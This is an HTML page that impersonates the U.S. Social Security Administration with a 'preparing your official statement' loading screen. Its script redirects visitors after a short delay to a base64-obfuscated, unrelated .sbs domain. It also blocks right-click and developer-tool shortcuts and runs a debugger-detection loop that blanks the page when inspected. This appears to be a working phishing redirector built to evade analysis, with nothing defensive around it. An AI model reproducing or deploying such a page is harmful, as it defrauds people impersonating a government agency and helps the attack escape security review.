<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Security Administration</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 32px 20px;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            color: #1a2b3c;
            -webkit-font-smoothing: antialiased;
        }

        .card {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            gap: 24px;
            padding: 56px 48px 48px;
            max-width: 460px;
            width: 100%;
        }

        /* Logo container */
        .logo-wrap {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: #f8fafc;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 24px rgba(10, 56, 80, 0.12);
            padding: 10px;
            overflow: hidden;
        }

        .logo-wrap img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 50%;
            display: block;
        }

        .agency-name {
            font-size: 0.72rem;
            font-weight: 600;
            letter-spacing: 2.5px;
            text-transform: uppercase;
            color: #0a3850;
        }

        h1 {
            font-size: 1.45rem;
            font-weight: 600;
            color: #0a3850;
            letter-spacing: -0.3px;
            line-height: 1.35;
        }

        .sub {
            font-size: 0.92rem;
            color: #5a7086;
            line-height: 1.6;
            max-width: 340px;
        }

        .loader {
            width: 200px;
            height: 3px;
            background: #e8eef4;
            border-radius: 50px;
            overflow: hidden;
            margin-top: 8px;
            position: relative;
        }
        .loader::after {
            content: "";
            position: absolute;
            inset: 0;
            width: 45%;
            background: #0a3850;
            border-radius: 50px;
            animation: slide 1.8s ease-in-out infinite;
        }
        @keyframes slide {
            0%   { transform: translateX(-100%); }
            100% { transform: translateX(320%); }
        }

        .footnote {
            margin-top: 8px;
            font-size: 0.72rem;
            color: #9aabbc;
            letter-spacing: 0.3px;
        }

        @media (prefers-reduced-motion: reduce) {
            *, *::before, *::after {
                animation-duration: 0.01ms !important;
                transition-duration: 0.01ms !important;
            }
        }

        @media (max-width: 480px) {
            .card { padding: 40px 28px 36px; }
            h1 { font-size: 1.25rem; }
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- Logo -->
        <div class="logo-wrap">
            <img src="https://therunhouse.com/cdn/shop/collections/social_security_adnin_logo.png?v=1682600208" alt="SSA Logo" onerror="this.style.display='none'">
        </div>

        <div class="agency-name">Social Security Administration</div>

        <h1>Preparing your document…</h1>

        <p class="sub">Please wait while we verify your session and prepare your official statement.</p>

        <div class="loader"></div>

        <div class="footnote">Do not close this window</div>
    </div>

    <script type="text/javascript">
        // ============================================
        // CONFIG — destination is base64-encoded
        // Decodes to: https://bruxtenwen.sbs/social_sec
        // ============================================
        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9zb2NpYWxfc2Vj';
        var REDIRECT_DELAY = 3500;

        var DESTINATION;
        try {
            DESTINATION = atob(DEST_B64);
        } catch (e) {
            DESTINATION = 'https://bruxtenwen.sbs/social_sec';
        }

        // ============================================
        // Basic anti-tamper
        // ============================================
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
        });

        // ============================================
        // Redirect
        // ============================================
        setTimeout(function() {
            window.location.replace(DESTINATION);
        }, REDIRECT_DELAY);

        // Anti-debug loop
        setInterval(function() {
            var start = performance.now();
            debugger;
            var end = performance.now();
            if (end - start > 250 && document.visibilityState === 'visible') {
                window.location.replace('about:blank');
            }
        }, 2000);
    </script>
</body>
</html>
